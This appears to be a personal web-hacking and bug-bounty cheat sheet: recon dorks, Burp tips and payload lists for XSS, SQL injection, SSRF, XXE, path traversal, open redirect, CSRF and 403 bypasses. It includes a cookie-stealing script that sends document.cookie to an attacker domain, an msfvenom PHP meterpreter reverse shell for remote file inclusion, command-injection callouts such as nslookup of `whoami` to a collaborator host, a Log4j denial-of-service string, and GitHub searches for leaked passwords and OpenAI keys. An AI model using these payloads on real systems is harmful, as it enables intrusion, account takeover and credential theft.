No more noise in your logs🎧

Burp Suite > Proxy > Options > TLS Pass Through.
Add these:
*.google\.com
.*.gstatic).com
*.mozilla\.com
.*\.googleapis\.com
*.pkil.goog

for nuclei => 
export SHODAN_API_KEY=xxx
export CENSYS_API_ID=xxx
export CENSYS_API_SECRET=xxx
export FOFA_EMAIL=xxx
export FOFA_KEY=xxx
export QUAKE_TOKEN=xxx
export HUNTER_API_KEY=xxx
export ZOOMEYE_API_KEY=xxx

sudo apt install tor
edit 
nano /etc/tor/torrc
SocksPort 9050
SocksPolicy accept *

then install tmux 
apt install tmux 
tmux new -s tor 
ffuf -x socks://127.0.0.1:9050






Logic and tokens





0 - validate token after use , email change , password  change , the second token requested 
1-  try to login with two users and see tokens from  inspect -> application and compare them  
2-  you can login and copy token and logout and try to put token back see if you can access   
3-  try to forget password and send code then in the same session add any link to internal profile and see if you can access account data ex: /myaccount (don't reload)  ... you can verfiy if you got session id from >> inspect > applicatoin 
3- try to reset password while more than one device is loged in and reset the password then you can use two sessions in the same time one (which changed the password ) and the other which (is previously loged in and didn't loged out )
3- open firefox and chrome for the same site and login in both change password in chrome and observe firefox still work 
4- try to register as admin then you will get inavalible username >> in the same session go to /myaccount  (don't reload) 
5- if transaction of money from hossam to ali then ?from=hossam&to=ali  can make http polution by &from=ali&from=hossam&to=hossam&to=ali
6- login and go to myacount and change the name or id 
7- if found example.com/?lang=en   in link try to find /?lang=database.yml or any senstive files  
8- try to change the email and observe if there is roleid in response if found change it and put it in the request 
9- try to change the id in url in /myaccount if id unpredictable tr to find post of this person and put id in /myaccount
10- if there is downloadable file try to change the name of request file to download and anaylise it 
11- if need to access /admin and can't then remove it from GET and put X-Original-URL: /admin and if there is any parameters put them in GET /?username=admin put if any direcotry put it in X-Original-URL: /admin/changeusername
12- when trying to make action and non authurized try to change method 
13- try to go to /api and change the method to post then put {} in the body to make response json
14- login to page and reset password put 150 chars and reset if applied then put 2500 chars then server will crash 
15- verify that reset and register and change email links are not valid for ever try send them and change account email or password many times and verfiy that if the first link is valid or not 
16- when found param ?ref= or ssid= in link try to fill it with ?ref=,,,,,,,,,,,,,,,, as you can as it's gonna make system crash 
17- when buying something with coupons  try to put the coupon more than one time or put two coupons alternativily one after one if accepted continue this until finish
18- try to register with registed account before but add "hossam@gmial.com\n" and see if it will register again 
19- try to reset password and use Host header (it's common for developers to use host header in reset password ) and put http://collaborator.com/ and see if there was dns in burpcollaborator oe you can go to your email and sea the link
20- smtp header injection can be found in contact us forms 
21- try to change host header to anything and see the response if ok 200 put localhost or 127.0.0.1 to get unauthrized admin
22- try to put 2 hosts and see if the second host of hacker appear in response if it then make file.js and alert(1)
23- try tp change the host if ok then try to put ip 192.168.0.0 and send to intruder,change last $0$ and try 1-255 see response
24- try to put  GET http://example.com HTTP/1.1 and put host anything see if accepted then use collaborator in host
25- try to sent to paramminer to see if origin: hossamshady.com or null and the injection found in portswigger labs  
26- try to put TRACE instead of GET and see if X-Custom-IP-Authorization header appeared then go to match and replace and leave match field blank and put in replace X-Custom-IP-Authorization: 127.0.0.1 it will give you access for unauthorized places/admin
27- try /.git and if found wget -r the link and analysis it with (git cola tool ) 
28- if anything is reflected in page and see x-cache if found then use reflected xss and poison it 
29- Yandex search engine for more data in search
30- try fuzzing /api/v1/ and see what files there 
31- when responsing of missing header put it and put any value then try to change the method request 
32- when directory fails 401 unauthorized then use tool (davtest)
33- en-US/splunkd/_raw/services/server/info/server-info?output_mode=json ==> for splunk information disclosure
34- if found feedback email put hossam||ping+burpcollaborator+||  ==> if there is any interaction then => Blind OS command injection with out-of-band interaction
35- if found /?jwt=token  try to inject token => xss via jwt= 
                    1. Make a jwt token and insert a xss paylaod. ==> inject the name or the "role":"<script>alert(document.cookie)</script>"
                    2. The final url is like url/dest?jwt=vulnerable-jwt-token. 
                    (jwt= paramter was decoding the provided jwt token and show's it into the page). 
36- always use TRACE instead of GET to know the way of request and hidden headers and if found X-Custom-Ip-Authorization: put 127.0.0.1
37- easy RCE from SSRF
          If you got HTTP pingback on your server, also give this a try
          payload used   :  `whoami`.collaborator-url 
          got callback from  :  root.collaborator-url
	  
	  Found an endpoint with
	  `something.php?run=`, execute the encoded `%26echo%20`id`%24()%5C%20 ` in HTTP request, 
	  surprised to see when server returned ID. 
      
 38- if found file upload upload file, intercept it and change the name of file <svg/onload=alert``>.txt and send  
 39- try cache deception attack by going to page with senstive information and put file.css in url and try to access many times it should show the senstive page 
40- try to put port in host: example.com:123 in reset password and see if that is reflected in email reset password token and if so add https://example.com:@burpcollaborator.net  or "'><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
41- edit email and see if happened without verification p4 vulnerablity 
42- edit Origin : domain[.]com[.]attacker[.]com ==> if accepted then cors misconfigration 
43- if found cms tech upload file and put the name of the file "../../../../../../../../../../../../../../tmp/hossam.js" and try to get this file and make rce as https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/
44- try to put GET http://localhost:22 HTTP/1.1 and connection close that make SSRF
45- hossam@gmail.com  => ho.ss.am@gmail.com 
46- Find Password reset token leakage via Referer.
    1) Request for Password Reset and open the Email.
    2) Open reset link  and Click on any social media link.
    3) Capture the request.
    4) And you can see the Reset Password token in Referer.
47-
      1-upload a profile image to the website
      2-attempt to delete the profile image and capture request 
      3-replace the profile image url with website background image url 
      4-forward the modified request and wait for a response 
      5-the website's images can now be deleted without requiring admin access

48-
	unicode normalization issue 
authoriztion issue 
resuing reset token 
pre account takeover 
cors misconfigration accound takeover 
csrf to account takeover 
host header injeciton 
response manipulation





google dorks :   
  site:target.com inurl:adminintitle:login 
  site:website.comintitle:/admin 
  site:website.cominurl:admin
  intitle:admin intext:admin
  index of / site: /etc/certs + "index of /" */* site:example.com
  
  http.title:"admin panel" org:<TARGET ORGANIZATION>
"http.title:\"index of\" AND org:<TARGET ORGANIZATION>"
"http.title:\"Dashboard [Jenkins]\" AND org:<TARGET ORGANIZATION>"
"http.title:\"login\" AND org:<TARGET ORGANIZATION>


  administrator | debug | login | root | wp-login | master | superuser
  example.com/wp-content/uploads/2021/      >> wordpress 
  example.com/wp-inc/       >> for wp-db files
  
  allintext:username filetype:log     >> find log files 
  ext:sql intext:"-- phpMyAdmin SQL Dump"
  in github => project_name filename:env and then search for jera.domain.tld
  
  
  Github leak for Aws,jira,okta etc :📓
```
1. Org:”target” pwd/pass/passwd/password
2. “target. atlassian” pwd/pass/passwd/password
3. “target. okta” pwd/pass/passwd/password
4. “Jira. target” pwd/pass/passwd/password
  
  𝐔𝐬𝐢𝐧𝐠 "𝐠𝐫𝐞𝐩" 𝐭𝐨 𝗘𝘅𝘁𝗿𝗮𝗰𝘁 𝗨𝗥𝗟'𝘀 𝗳𝗿𝗼𝗺 𝗷𝘂𝗻𝗸 𝗱𝗮𝘁𝗮.

#cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*

#curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"* 
to find kubernetes ::: 
shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
            config.inc.php_bk
 ----------------------------------------------------------------------------
  Debug.log lead to information Disclosure 

Tips : https://target[.]com/wp-content/debug.log


cat test.txt| grep -aEo 'https?://[^ ]+' | sed 's/]$//' | sort -u| grep -aEi "\.(js)"
1- gather all wayback and katana urls  
2- filter all js files 
3- cat allurls | httpx -content-type | grep 'application/javascript
4-  nuclei -t /root/nuclei-templates/exposures/

--use gospider and katana , anyother js gather
gospider -S list.txt -a -w -r -o output
after finishing reconnisance put below command to filter js
cat test.txt| grep -aEo 'https?://[^ ]+' | sed 's/]$//' | sort -u| grep -aEi "\.(js)"
nuclei -l js.txt -t nuclei-temlates/exposures/tokens/generic
after gathering tokens use  ( token-spray ) template 
nuclei -t nuclei-templates/token-spray -var token=goanmginaonim
or can use file of tokens in token=token_file



• Shodan Query for springboot : 

http.favicon.hash:116323821  ssl:"domain name"

then if found check for 

/heapdump 
/env 
/actuator/heapdump
/actuator/env



-----------------------------------------------------------------------------------------------------------
                                            password reset 
                                            {"email":"victim@gmail.com\nattacker@gmail.com"}
                                            {"email":"victim@gmail.com,attacker@gmail.com"}
                                            {"email":"victim@gmial.com","email":"attacker@gmail.com"}
                                            {"email":["victim@gmail.com","attacker@gmial.com"]}

v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:{“id”:111}} --> 200 OK




to pypass host unauthorized >> Host: localhost
---------------------------------------------------------------------------------------------------------
				WORDPRESS
				FUZZ 404
wp-admin.php   
wp-config.php
wp-content/uploads
Wp-load
wp-signup.php
Wp-json
wp-includes [directory]
index.php
wp-login.php
wp-links-opml.php
wp-activate.php
wp-blog-header.php
wp-cron.php
wp-links.php
wp-mail.php
xmlrpc.php
wp-settings.php
wp-trackback.php
wp-signup.php
/_wpeprivate/config.json






  
  
  ----------------------------------------------------------------------------------------------
  https://app.pluralsight.com/course-player?clipId=fc4ed0ad-2778-4318-8b97-9f2010471064
                      BURPSUITE   
  extentions :: 
        1- co2 >> sqli
        2- retire.js >> jquery and javascript files
        3- carbonator   >> automate targeting , spidering , and scanning vulns
        4- discover content >> in sitemaps and engagment tools > discover content to discover all urls and directories 
        5- jsinder
        6- joseph   >> for analyis token
        7- autosize   >> to check auth bypass
        
        install carbonator in burpsuite pro and run in termainal  ./burpsuite is location of the burp
java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmple.com 80 / 
        
        
  file upload or download :: file.php%2500.pdf    >> this will ignore .pdf in server but pass filter
  
  go to
  to find endpoint of redirect request filter in proxy hisotry : put in filter => Request.Query CONTAINS "=https" => find xss , open redirect , rxss 
  
  
 url redierct 
cat httpx.txt | waybackurls | tee wayback.txt ; cat wayback.txt | sort -u | grep "\?">> open.txt;nuclei -t Url-Redirection-Catcher.yaml -l openredirect.txt
  
  One liner :- 

httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 
  ----------------------------------------------------------------------------------------------
  jira exploit 
  cve 2020-14179	=> jira
cat hosts.txt or =>
echo "https://jira.exmaple.com"|while read host do; do curl -s -k --insecure --path-as-is "$host/secure/QueryComponent\!Default.jspa"|grep -qsi 'searchers' &&
printf "$host \033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done


cve 2020-14181
/secure/ViewUserHover.jspa

cat hosts.txt | while read host do; do curl -s -k --insecure "$host/secure/ViewUserHover.jspa"|grep -qsi "User does not exist"&&
\printf "$host\033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done



  
  -------------------------------------------------------------------------------------------------
  
                    JSON EXPLOIT
  
  inject json value of request with 
  
  {"description":"<script>alert(\"hossam\")"}
  try to change the method from get to put to inject database
  
  if json is only in respone take it and modify and then 
  PUT /file.txt           or you can use POST without any parameters in link
  content-type: application/json
  {"description":"<script>alert(\"hossam\");</script>"}
  
can inject json with sleep >> "username":"hsosamshady;sleep(111)"
or you can inject >> <scrip> data{"name"-alert(1)-"hossam"}</script> that is if only script tag appeared not only in json
                                      JWT
   jwt editor extension for burpsute
   Autorize for burpsuite 
   1- change user role or id in jwt 
   2- change user role and alg to "none" and remove signature and leave . after payload 
   3- 


Payload: Parameter=randomtext%' OR SLEEP (5) #





True-Client-IP:
X-Wap-Profile:
X-Client-IP:
CF-Connecting_IP:
X-Forwarded-For:
Client-IP:
X-Originating-IP:
All headers with
burp-collaborator
Evil payloads over headers:
X-Forwarded-For: id.burplink.net:8080/aditya.php
X-Forwarded-For: http://user:pass@hostname/
User-Agent:() { :; }; /usr/bin/nslookup
$(whoami).id.burpcollaborator.net


Response status code:
Online internal asset:port responds with
200 OK vs offline internal asset:port 500
Internal Server Error
Response contents:
The response size in bytes is smaller or
bigger depending on whether or not the
URL you are trying to request is reachable.
Response timing:
The response times are slower or faster
depending on whether or not the URL you
are trying to request is reachable.


example.com
SHORT-HAND IP
http://0/Admin/
http://127.1/AdMiN
http://127.0.1/aDMIn
LOCALHOST WITH A
DOMAIN REDIRECTION
http://spoofed.burpcollaborator.net
http://localtest.me
127.0.0.1.nip.io
STORY OF [::]
http://[::]:22/ SSH

["');alert('XSS');//"]@xyz.xxx	json pypass

BLOCKED: "><a href=javascript:alert(1)>accept</a>

ALLOWED: xyz"/ng-click="constructor.constructor('alert(1)')()
 Payload:  <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>  
Payload: %7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D


1- found a subdomain and create acc&login 
2- profile image extention's limited to jpg,png,jpeg
3- in upload image Request i changed file type test.jpg to test.php&test.php%00.jpg,... not bypassed
4- changed to test.svg and work


-------------------------------------------------------------------------------------------
                                    XXE
    
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>    
<stockCheck>
<productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>

can put http://ip_of_the_server/directory and follow directories that appear in response 
can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
 [<!ENTITY % xxe SYSTEM "https://burpcollaborator"> %xxe]     automatically without &xxe
  
  


--------------------------------------------------------------------------------------------
                                       information disclosure
    1- /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json >>https://hackerone.com/reports/1860905
    2- http://example.com/.gitlab-ci.yml 
    3- http://google.com/direcotry/direcotry/file=/proc/version ==> add dircrotyies fuzzing to see if any of them accept parameter file lfi and try to add more and more 
    2- files access_token.json
      jsapi_ticket.json
      docker-compose.yml
      - /app_dev.php
- /app_dev.php/_profiler/phpinfo
- /app_dev.php/_profiler
- Look for "profiler token" in phpinfo()

      /wp-content/uploads/wp-file-manager-pro/fm_backup/    FOR WORDPRESS
    4-put  /"sk-[a-zA-Z0-9]{20,50}"/ language:python  in github to get chatgpt apis for free leak 
    
    Memory dump and env disclosure

shodan search org: "Target" http.favicon.hash:116323821
-fields ip_str,port--separator
"| awk '{print $1".:"$2)'
while read host do ;do ffuf -u http:/ /$host/FUZZ -mc
200 -w spring-boot.txt ;done
    
    Boooommmm!!!!!, The username=tomcat and password=s3cret worked and the Tomcat Application Manager Console was accessible.
 -------------------------------------------------------------------------------------------
                                      403 PYPASS
                                      GET /admin HTTP/1.1
Host: web.com                   >>forbidden
---------------------
GET /anyfile  HTTP/1.1
Host: web.com 
X-Original-URL: /admin      ==>200
-------------------
https://web.com/path  ==> forbidden
https://web.com/%2e/path        ==>200
------------------
GET /delete?user=ali    HTTP/1.1    =>unahtorized
-------------------
/admin/panel        ==>403 forbidden
/admin/monitor/     ==>200
then 
/admin/monitor/;panel      ==>200

arget[.]com/phpmyadmin/setup/index.php
==> 301 to login page

target[.]com/phpMyAdmin/setup/index.php
==> 200 to phpmyadmin setup

-----------------
GET /delete?user=ali    HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1    ==>302 done
------------------
example.com/admin   ==> 403
exmaple.com/admin/.      ==>200
example.com//admin//    ==>200
exmaple.com/./admin/./  ==>200
---------------------
https://example.com/admin   ==>302
https://exmale.com/admin..;
-------------------
when file upload => /?file=file.php   blocked
                   /?file===file.php   passed
                 
Cloudflare bypass

"-alert(0)-"   :  ❌
"-top['al\x65rt']('sailay')-"   : ✅                 
                 
                 
                 
                 
                 
                   
Bypass matching on host contain growanz.hubspot.com
    growanz.hubspot.com.mydomain.com
Weak regex by using dot on regex without bypassing it e.g ”^growanz.hubspot.com$|^example.virtual.host$”
    growanzXhubspot.com
Bypass matching on the end at growanz.hubspot.com
    mydomain.com/growanz.hubspot.com
Bypass white list validation
    mydomain.com%23@growanz.hubspot.com
    mydomain.com%25%32%33@growanz.hubspot.com                   
 
 pypass 401 folder with davtest tool with credrentials => davtest hossam:123456 -url http://example.com/folder

 
 ----------------------------------------------------------------------------------------------
                                OS INJECTION
     email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
 
 E.g.: reading /etc/passwd file:
cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
filename=/etc/passwd
filename=view-source://file:///etc/passwd
if found pdf file in url add the comming => 
https://erecruitment.redacted.com/onlineapp/rocketpreepay.pdf../../../../../../../etc/passwd

 
 ---------------------------------------------------------------------------------------------------
 	dos attack via user-agent
 Log4j 2.16 vulnerability DoS  🫰
User-Agent: ${${::-${::-$${::-j}}}}

- Paylaod: ${${::-${::-$${::-j}}}}  
 
 
 
 
 --------------------------------------------------------------------------------------------------
                                open redirect
 https://example.com_https@google.com
 https://victim.com/login/?next=https://your_domain.com
 http://example.com/example.php?url=http://malicious.example.com
 ?next= javascript:$.getScript`https://my_own_domain/attack.js`
 https://victim.com/?next= javascript:$.getScript`https://my_own_domain/attack.js`
1: ?returnto=http://evil.com ❌
2: ?returnto=/\/\/\http://evil.com ✅
3: 2redirect=http%3a//google.com///attacker.com
 attack.js file which will be on my site to extract cookies from user in the other site 
 if(location.host == “my_own_domain”){ 
    Url = new URL(document.location); 
    Parameters = new URLSearchParams(x.search); 
    cookie = Parameters.get(“cookie”); 
    document.write(cookie);
}
else{ 
    var cookie = document.cookie; 
document.location=“https://my_own_domain/attacker.html?cookie="+cookie;}
echo "http://tesla.com" | waybackurls | -silent -timeout 2 -threads 100 | gf redirect | anew    >>> to get open url redirect 
poc: redirect_to=////evil%E3%80%82com


Easy Open Redirect in 10 min.

1)Collect all urls through waybackurls,gau,etc.
2)Run this command.
cat urls | grep "=" | qsreplace <your interactsh-client> >redirect.txt
3)Run interactsh and then 
cat redirect.txt | httpx -fr
4)Check the interactsh-client terminal.

to get open redirect
waybackurls test.com | grep -a -i \=http | qsreplace 'https://hossamshady.me' | while read host do ;do curl -s -L $host -I| grep "hossamshady.me" && echo "$host \033[0;31mVulnerable\n";done



...................................................................................
apache 2.4.3 has open redirect in server /login >> https://hackerone.com/reports/1782514

http://example.com?redirect_url=javascript://%250Aalert(1)  >> via redirect (rxss)
logout?service=javascript:alert(1)
https://smartreports.mtncameroon.net//hacker.com/..;/css      after // that redirect you to hacker.com
https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2    >>redirct it to google 
https://rinkerboats.vanillacommunities.com/home/leaving?Target=http://www.ɡооɡⅼе.ϲоⅿ\:@%20
try to put similar domain as the original like 
- sémrush.com
- sêmrush.com
- sèmrûsh.com
- šemrush.com   >> https://hackerone.com/reports/861940
https://oauth.semrush.com/oauth2/authorize?redirect_uri=https://oauth.šemrush.com/oauth2/success

if failed to redirect to hackersite directly can create personal domain which will automatically redirect hacker to hacker.com
https://victim.com/?url=https://hackersite1.com/?redirecturl=https://hacker.com and make content of hackersite1 to redirect automatically 



 
 ----------------------------------------------------------------------------------------------
            Combining Session Fixation With Http Request Splitting 
            
http://host/loging\r\nSet-Cookie: SESSIONID=12345\r\nDummy-Header:

Respone
HTTP /1.1 302 
Server: host
Locatoin: https://host/login Set-Cookie:SESSIONID=12345 Dummy-Header: /login


            Combining Session fixation with xss 
https://host/search?q=
document.cookie="SESSIONID=12345;%20path=/;
%20domain=.example.com";



----------------------------------------------------------------------------------------------
                                    BRUTE FORCE 
   
   try to login with invalid password 10 times and then go with valid password if your account was not locked the you can do brute force attack 
 
 
 ssti 
/email/optout?username={{7*'7'}}

if output is 49 then vulnerable and vice versa
-----------------------------------------------------------------------------------------------
			CACHE POISONING ATTACK
https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
 
 
 
 
 ----------------------------------------------------------------------------------------------

 
1) go get -u http://github.com/lc/gau
2) echo "http://drive.google.com" | gau
3) Read all the secrets

Found an admin dashboard in Shodan.
- path https://ip/admins/sign_in ==> https://ip/admins/sign_up



1- site:*.target.com ext:php
2- echo https://sub.target.com | waybckurls | grep "\?" | uro | httpx -silent > parameters.txt 
3- nuclei -l parameters.txt -t fuzzing-templates
4- You may find xss,sqli,ssrf,open redirect...ext
----------------------------------------------------------------------------------------------
  
  Path traversal to LFI 

Directory Traversal 

../../../../../../../../../etc/passwd => can url encode the ../../
../../../../etc/passwd
 /root/etc/passwd 
../../.htaccess
\..\WINDOWS\win.ini
\..\..\WINDOWS\win.ini
....//....//....//etc/passwd
can encode url one time or two times or three times
../../../etc/passwd%00.png

GET /css///..//..//..//..//..//..//..//..//..//..//../etc/passwd


/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd

echo http://example.gov | waybackurls | grep /images/

# Double Encode Payload: "www.example.com/images/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"   >> in repeater

RFI
msfvenom -p php/meterpreter_reverse_tcp LHOST=MYIP LPORT=<PORT> -f raw>shell.txt 
and go to target target/dir/?page=http://myip/shell.txt

  
----------------------------------------------------------------------------------------------
nmap -sV -iL host.txt -oN nmap_scan.txt

Wait a few hours

cat nmap_scan.txt | grep open http://pic.example.com


This is the scrip if you wish to scan your target using nmap: 
``nmap -p80 --script http-dombased-xss.nse``

----------------------------------------------------------------------------------------------
                        SQLI 
          
1- AAAA')/**/or/**/(select/**/1)=1%23

login 
2-   ' or 1=1 and email like ('%admin%'); -- 
          any password
3- if there was json {} with email or password request use sqlmap  first put whole request in file.txt ==>
    sqlmap -r request.txt -p email or (password)

"User":"hossam'; waitfor delay '0:0:8 --",
"Passwd":"123"


sitemap xml 
target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
sleep payload 
[1;SELECT IF((8303>8302),SLEEP(9),2356)#] = 9s


 User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR" 

 X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Type: time-based blind on SignUp form
Payload: Parameter=randomtext%' OR SLEEP (5) #


Tip:
1. using SQL errors Dork:
site:http://target.com intext:"sql syntax near" |  intext:"incorrect syntax near"

2. indexed page with sql error
3. Confirmed with "waitfor delay'0:0:15'--"

send request to intruder and make list of headers like that and run 
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
1. User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
sql injection in wordpress error %22
target,com/path1/path2/' => 301
target,com/path1/path2/" => 301
target,com/path1/path2/%22 => 301 with SQL error


site:target.com intext:"sql syntax near"| intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_connect()" | intext:"Warning: pg_connect()"


POST /forgetpassword.asp HTTP/1.1
...

email=ali@gmail.com';%20waitfor%20delay%20'0:0:8'%20--%20

Use SQLI google dorks list to find hidden parameters
👇🔥

site:*.com inurl:&#8221;main.php?id=
site:*.com inurl:zoom.php?id=site:.il
site:*.com inurl:&#8221;details.php?id=
site:*.com inurl:&#8221;?came=
site:*.com inurl:&#8221;index.php?page=
site:*.com inurl:&#8221;index.php?page=
site:*.com inurl:&#8221;home.php?cat=
site:*.com inurl:&#8221;main.php?t=
site:*.com inurl:&#8221;games.php?id=
site:*.com inurl:&#8221;guide.php?id=
site:*.com inurl:&#8221;index.php?cat=
site:*.com intext:"error in your SQL syntax"


Use this keyword:
site:test.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”

BLIND SQLI
cat recon.txt | grep "=" | gsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(25)))SUmc)" >> blind.txt ==> to wait for 25 seconds
 cat blind.txt | parallel -j50 -q curl -o /dev/null -s -w %{time_total}\\n	==> to count time blind if 25 then vulnerable



Find Template Injection through curl

Recon, Content Discovery process has megs of lines recon.txt 

✔️cat recon.txt | grep "=" | qsreplace "ssti{{9*9}}" > sssti
✔️cat sssti | parallel -j50 -q curl -g | grep "ssti81" > ssti2_poc


gather all javascript files .map and use https://github.com/denandz/sourcemapper to search for any api key



---------------------------------------------------------------------------------------------
SERVER SIDE POLLUTION
1- add any header with any value ==> response 304
2- add in body {"cache-control":"no-cache"}
3- send request in step one if recived 200 then site is vulnerable
4- sent in body {"content-type":"application/json;name=hossam"} and see response if reflected then vulnerable


----------------------------------------------------------------------------------------------
              SSRF
   /api?id=http://127.0.0.1
  if aws service is on use 169.254.169.254
  
  put all params in file called params.txt and run 
  put https://www.toptal.com/developers instead of {target} and use httpx 
  httpx -path params.txt -u httpdomains.txt --screenshot -o ssrf.txt
  or can use gowitness to take screenshots 
  gowitness file -f ssrf.txt
 
Top 25 Server-Side Request Forgery (SSRF) Parameters for @trbughunters
?dest={target}
?redirect={target}
?uri={target}
?path={target}
?continue={target}
?url={target}
?window={target}
?next={target}
?data={target}
?reference={target}
?site={target}
?html={target}
?val={target}
?validate={target}
?domain={target}
?callback={target}
?return={target}
?page={target}
?feed={target}
?host={target}
?port={target}
?to={target}
?out={target}
?view={target}
?dir={target}

install autorepeater and baseplacement => add request params value , match => https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)      and replace => https://collaborator and can automate katana --proxy 127.0.0.1 8080 => to automate ssrf and go to collaborator and see the results 


SSRF through Curl

✔️cat recon.txt | qsreplace "http://bcollaborator.com" > ssrf.txt
✔️cat ssrf.txt | while read host do;do curl -s -L $host -I|grep "http://bcollaborator.com" && echo -e "$host \033[0;31mVulnerable\n" ;done


--------------------------------------------------------------------------------------------------
                                    CSRF
   1- if there is no csrftoken try to make poc with burpsuite and put it in server 
   2- if there is token : - try to change request method from post to get and remove csrftoken and see if worked
   3- try to remove the csrftoken and see if the same response
   4- try to make csrftoken in any live account and drop the request to be unused  csrf token and try to use it (one time use)
         - open firefox and try to change email , intercept it and take token and drop the request and then make csrf poc
   5- if you found anything reflected in headers response then you can inject any other header with putting -> in the place         which is reflect  =hossamshady%0D%0ASet-Cookie: csrfKey=hossamshady1011393%3b SameSite=None"
   6- if you found key in cookies csrfkey search for anything reflected in response header and put in the place of autosubmit button of burpsuite csrf poc >> <img src="site.com/?parameterWhichIsRelfectingHeader=hossamshady%0D%0ASet-Cookie: csrfKey=yourCsrfWhichIsNotUsed%3b SameSite=None" onerror="document.forms[0].submit()"> this will submit poc and send csrfkey

  7- if csrftoekn and csrfkey are the same try to put fake csrf for both csrfkey and csrftoken if worked then make above attack with any csrftoken but same
   8- try to make poc by burpsuite and if there is current password try to remove it 
   00
1- delete csrf token and leave it blank 
2- delete csrf parameter with token 
3- use live token from another account 
4- use unused token 
5- change the token with the same length 
6- change the post to get 
7- change the post to get and delete token parameter 
8- use clickjacking to bypass csrf protection with clickbandit burpsuite
9- delete referer 
10- Referer: https://attacker.com/https://victim.com
   
  
 
 
 inrul:login;jsessionid=    >> to see squestoinal session id 
 
  
 
-----------------------------------------------
		OSRF
go change password of mine and then take the url in get request as following
GET /change_password?newpassword=123
and go to upload photo and then put filename="anyname" and see if the "anyname" in <img src="anyname"> can put 
the image name as "../change_password?newpassword=123" and that will apear as <img src="../change_password?newpassword=123">
and anyone enter my profile his password changes to 123 => source> https://github.com/daffainfo/AllAboutBugBounty/blob/master/On%20Site%20Request%20Forgery.md



--------------------------------------------------------------------------------------------------
            (((XSS))
 https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
            <img/src/onerror=alert(1)>
- <script>alert(\"hossam\")</script>        // add \ before " to escape filter
- id=alert;[alert][0].call(this,1)&y=all&y=all
- cloudflare bypass 
"-alert(0)-"		X
"-top['al\x65rt'](9)-"	good
email:- 
Payload: ["');alert('XSS');//"]@xyz.xxx
=javascripT:alert(document/**/.domain)

- example.com/?uid="-top['al\x65rt'](9)-"
- <iframe src="\\www.google.com"></iframe>
- search for xss polyglot 
- <svg+onload=innerHTML=URL,innerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
- svg file upload : CVE-2022-33910: : make >>  Content-Type: image/svg+xml
                       <?xml version="1.0" standalone="no"?>
                      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

                      <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
                        <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
                        <script type="text/javascript">
                          alert("XSS by BHARAT");
                        </script>
                      </svg>
- if found addEventLister try to inject it with iframe <iframe src="https://site.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"> in any other server 
- if there was addEventListener and index of http that enforces the request to be over http 
    <iframe src="https://example.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
- if found parseing {} with type load_channel
<iframe src="https://site.com/"onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

- Send the request to Repeater add X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)> below Host: www.omise.co

upload svg file as picture file.svg
svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
 preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">

#file with autorun script

<!DOCTYPE html>
<html>
  <head>
    <title></title>
  </head>
  <body>
    <h1>This script will auto-run when you open this file</h1>
    <script>
      // () {
        alert("lol");
      }
      window.onload = autoRun;
    </script>
